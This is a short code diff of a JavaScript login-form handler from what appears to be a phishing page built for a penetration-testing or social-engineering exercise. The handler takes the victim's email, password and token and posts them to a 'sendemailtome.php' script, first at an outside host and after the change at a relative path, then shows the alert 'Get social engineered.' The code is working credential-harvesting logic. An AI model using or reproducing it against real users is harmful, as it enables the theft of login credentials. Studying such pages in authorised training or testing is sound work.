@@ -66,20 +66,17 @@ function submitFormLogin(event) {
 
   // Add header that the value is going to be a value form
   // Reference: https://www.geeksforgeeks.org/http-headers-content-type/
-  fetch(
-    "https://www.studentmind.live/penetration_testing/malicious_website/api/sendemailtome.php",
-    {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-      },
-      body: `form=${form}&email=${email}&password=${password}&token=${token}`,
-    }
-  )
+  fetch("/api/sendemailtome.php", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: `form=${form}&email=${email}&password=${password}&token=${token}`,
+  })
     .then((response) => response.text())
     .then((data) => {
       if (data === "Email sent") {
-        alert();
+        alert("Get social engineered.");
       } else {
         alert("Something went wrong please try again later.");
       }
